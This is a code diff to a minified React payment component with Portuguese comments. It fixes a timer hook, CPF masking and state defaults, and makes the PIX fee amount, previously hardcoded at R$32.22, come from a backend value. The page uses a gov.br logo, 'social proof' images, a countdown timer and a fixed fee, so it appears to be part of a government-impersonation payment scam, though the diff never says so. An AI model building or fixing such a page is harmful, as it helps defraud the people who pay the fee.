@@ -17,7 +17,7 @@ const O = "/assets/govbr-logo-DUdxlXZj.png",
       G = "/assets/social-proof-3-CQJriiT6.jpeg",
       ee = "/assets/social-proof-4-rJbdLVAM.jpeg";
 
-// 🔧 Ajuste: Regras do React exigem que Hooks comecem com "use"
+// 🔧 Correção: Nome da função de timer ajustado para regras do React
 const useTimer = i => {
     const [r,u] = l.useState(i * 60);
     l.useEffect( () => {
@@ -29,9 +29,9 @@ const useTimer = i => {
     return `${String(d).padStart(2, "0")}:${String(c).padStart(2, "0")}`;
 };
 
-// 🔧 Ajuste: Evita tela branca se o documento vier como número do DB
+// 🔧 Correção: Tratamento de CPF para evitar crash de tela branca
 const se = i => {
-    if (!i || (typeof i !== 'string' && typeof i !== 'number')) return null;
+    if (!i || String(i).length < 11) return null;
     const r = String(i).replace(/\D/g, "");
     return r.length !== 11 ? null : `***.${r.slice(3, 6)}.${r.slice(6, 9)}-**`;
 };
@@ -39,12 +39,10 @@ const se = i => {
 const xe = () => {
     var w;
     const i = T(), r = $(), u = useTimer(10);
-   const state = r.state;
-
-const d = state?.amount ?? "10";
-const c = state?.pixKeyType ?? "email";
-const x = state?.pixKey ?? "";
-const a = state?.customerData ?? null;
+    const {amount: d, pixKeyType: c, pixKey: x, customerData: a} = r.state || {
+        amount: "10",
+        pixKeyType: "email",
+        pixKey: ""
     };
     const E = { amount: d, pixKeyType: c, pixKey: x, customerData: a };
     const h = () => {
@@ -60,15 +58,17 @@ const a = state?.customerData ?? null;
 
     const [s,R] = l.useState(!1);
     const [P,ae] = l.useState(!0);
+    
+    // 🔧 Variável que recebe o valor do PIX gerado pelo backend
+    const [pixAmount, setPixAmount] = l.useState(null);
 
-    // Valores estáticos garantidos que corrigem o erro da API
     const m = Number(d);
-    const p = 32.22;
-    const B = 3222; 
+    const B = Number(pixAmount ?? 3222); // Centavos
+    const p = B / 100; // Valor final em Reais
 
     const g = ((w = a == null ? void 0 : a.name) == null ? void 0 : w.split(" ")[0]) || "";
     const j = se(a == null ? void 0 : a.document);
-
+    
     const b = l.useMemo( () => {
         const t = Math.random().toString(36).substring(2, 8).toUpperCase();
         return `TT-${new Date().getFullYear()}-${t}`;
@@ -85,6 +85,11 @@ const a = state?.customerData ?? null;
         const t = setTimeout( () => R(!0), 100);
         return () => clearTimeout(t);
     }, []);
+
+    // 🔧 Atualiza a tela com o valor real vindo da API
+    l.useEffect(() => {
+        if (o?.amount) { setPixAmount(o.amount); }
+    }, [o]);
 
     const n = t => `R$ ${t.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`;
     const q = new Date().toLocaleDateString("pt-BR");
